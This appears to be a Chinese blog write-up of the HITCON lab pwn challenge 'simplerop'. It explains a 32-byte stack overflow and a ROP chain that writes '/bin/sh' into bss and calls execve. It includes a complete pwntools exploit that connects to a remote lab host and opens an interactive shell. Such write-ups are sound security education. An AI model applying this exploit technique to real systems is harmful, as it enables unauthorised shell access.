---
title: HITCON-lab
date: 2019-12-12 09:49:04
tags: pwn
---
<!-- more -->
## 0x01 Simplerop  
思路：  
32个垃圾数据 + execve("/bin/sh", 0, 0)  

首先运行一下，让我们输入，输入完成就会退出。  
那么我们继续用常用套路  
先检查保护，再用IDA看  
![](simplerop_1.png)  
![](simplerop_2.png)  
明显存在栈溢出 
![](simplerop_3.png)  
用cyclic查到溢出长度是32  
并且发现没有system函数以及/bin/sh  
那么需要自己构造execve(“/bin/sh”,0,0)  
该程序为32位程序，一次最多写入4 bit，那么需要把/bin/sh分两次写入（还需要知道0xb是execve的系统调用号）可以将/bin/sh写入bss段或data段  
![](simplerop_4.png)  
可以看到都是可读可写的段，我选择了bss段  
那么接下来去找gadget，这里用到ROPgadget这个工具去找  
![](simplerop_5.png)  
![](simplerop_6.png)  
![](simplerop_7.png)  
![](simplerop_8.png)  
找到了这几个gadget，然后这里的逻辑是，先将edx中放入bss段的基址，然后将”/bin”放入eax中，然后再将edx的地址中放入eax的值，相当于C语言中的*edx=eax，”/sh”同理，需要注意的是，”/sh”需要加截断符”\x00”，以及在此之前需要在edx中放入bss的地址加0x4，原理暂时未知。然后需要调用execve的系统调用号并布置参数，最后需要调用系统中断，系统中断后才能发送payload  
贴上exp:  
```Python
from pwn import*
#context.log_level = 'debug'
#p=process('./simplerop')
p=remote('120.79.1.69',10005)

pop_edx_ret = 0x806e82a
bss_addr = 0x80eaf80
pop_eax_ret = 0x80bae06
mov__edx__eax_ret = 0x809a15d
pop_edx_ecx_ebx_ret = 0x806e850

payload = "a"*32
payload+= p32(pop_edx_ret)
payload+= p32(bss_addr)
payload+= p32(pop_eax_ret)
payload+= "/bin"
payload+= p32(mov__edx__eax_ret)

payload+= p32(pop_edx_ret)
payload+= p32(bss_addr + 0x4)
payload+= p32(pop_eax_ret)
payload+= "/sh\x00"
payload+= p32(mov__edx__eax_ret)

payload+= p32(pop_eax_ret)
payload+= p32(0xb)
payload+= p32(pop_edx_ecx_ebx_ret)
payload+= p32(0x0)
payload+= p32(0x0)
payload+= p32(bss_addr)
payload+= p32(0x080493e1)


#p.recvuntil("Your input :")
p.sendline(payload)
p.interactive()             
```
